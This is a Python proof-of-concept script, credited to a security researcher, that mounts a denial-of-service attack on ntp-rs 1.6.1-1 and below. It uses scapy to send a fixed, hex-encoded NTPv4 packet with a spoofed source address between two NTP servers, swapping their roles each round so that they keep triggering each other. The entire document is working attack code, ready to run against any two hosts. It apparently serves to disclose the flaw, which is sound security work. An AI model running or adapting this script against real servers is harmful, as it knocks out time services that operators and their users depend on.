#!/usr/bin/python3
#
# DoS against ntp-rs 1.6.1-1 and below, written by eric.sesterhenn@x41-dsec.de
#
import binascii
import argparse
from scapy.all import *

# global variables
debug=False
count = 1

# Send packet to NTP server
def udpsend(source, target, data):
    global debug
    verbose = 1 if debug else 0

    ip = IP(src=source, dst=target)
    udp = UDP(sport=123, dport=123)
    pkt = ip/udp/data

    if debug:
        pkt.show()
    send(pkt, verbose=verbose)


ntpv4msg = binascii.unhexlify("240a03e600000000000000007f7f0101ec47e4c37c865168ec04cd98f5472b45ec47e4c5adab5aadec47e4c5adb1de90")

# Parse arguments and set defaults
parser = argparse.ArgumentParser()
parser.add_argument("source", help="Hostname or IP of source NTP server")
parser.add_argument("target", help="Hostname or IP of target NTP server")
parser.add_argument("-d", "--debug", action="store_true")
parser.add_argument("-c", "--count", type=int, help="Amount of packets to send", default=1)
args = parser.parse_args()

debug = args.debug
count = args.count
target = args.target
source = args.source

# create list with info on whether we got a response or not
for i in range(count):
    udpsend(source, target, ntpv4msg)


    # swap in case spoofed packets doesnt reach one of them
    target, source = source, target
print("")
